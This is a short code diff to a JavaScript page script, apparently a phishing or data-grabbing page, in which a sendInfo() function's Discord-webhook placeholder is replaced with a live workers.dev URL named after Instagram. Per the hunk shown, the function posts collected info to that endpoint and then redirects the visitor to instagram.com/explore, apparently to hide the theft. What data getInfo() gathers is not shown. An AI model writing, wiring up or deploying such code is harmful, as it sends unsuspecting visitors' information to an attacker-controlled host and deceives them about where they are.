@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "YOUR_DISCORD_WEBHOOK"; //your discord webhook url
+  const webhook = "https://instagram.genki-mugi.workers.dev/"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
@@ -88,6 +88,7 @@ async function sendInfo() {
     window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
 }
+
 
 
 
